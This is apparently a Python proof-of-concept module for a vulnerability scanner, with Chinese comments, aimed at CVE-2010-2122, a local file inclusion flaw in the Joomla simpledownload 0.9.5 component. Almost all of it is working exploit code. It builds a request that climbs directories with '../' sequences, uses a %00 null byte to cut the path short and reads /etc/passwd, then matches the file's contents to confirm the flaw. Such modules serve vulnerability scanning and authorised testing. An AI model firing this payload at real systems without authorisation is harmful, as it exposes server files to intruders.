# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0049'  # 平台漏洞编号
    name = 'Joomla Component simpledownload 0.9.5 - LFI Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2017-08-22'  # 漏洞公布时间
    desc = '''
        Joomla 组件simpledownload 0.9.5版本由于对参数controller过滤不严格，导致存在本地文件包含漏洞,可以结合%00截断，实现该漏洞的利用。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-68620'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2010-2122'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = '0.9.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a5c05ba2-fa54-47e1-80d9-a58c39a1c0c4'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 文件名称
            filename = '/etc/passwd'
            # 漏洞利用的地址
            payload = '/index.php?option=com_simpledownload&controller='
            # ..的个数
            dots = '../'*14+'..'
            # 截断符
            dBs = '%00'
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 自定义的超时信息
            time = 50
            # 构造访问连接地址
            vulurl = arg+payload+dots+filename+dBs
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=time)
            # 判断返回页面内容
            if resp.status_code == 200:
                # 匹配内容
                match = re.search(
                    'nobody:.+?:[0-9]+:[0-9]+:.*:.*:.*', resp.text, re.S | re.M)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
